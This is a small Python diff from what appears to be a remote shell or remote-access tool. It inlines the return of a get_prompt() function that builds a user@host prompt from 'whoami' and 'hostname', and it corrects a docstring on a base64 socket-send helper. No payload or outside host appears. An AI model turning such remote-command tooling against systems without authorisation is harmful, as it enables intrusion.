@@ -96,14 +96,13 @@ def get_prompt():
     user = cmd_exec('whoami').strip()
     hn = cmd_exec('hostname').strip()
     end = '#' if user == 'root' else '$'
-    aa = '{}@{} {} '.format(user, hn, end)
-    return aa
+    return '{}@{} {} '.format(user, hn, end)
 
 
 def socksend(s, msg):
     """
         Sends message using socket operating under the convention that the
-        first five bytes received are the size of the following message.
+        first nine bytes received are the size of the following message.
     """
 
     pkg = base64.b64encode(msg)
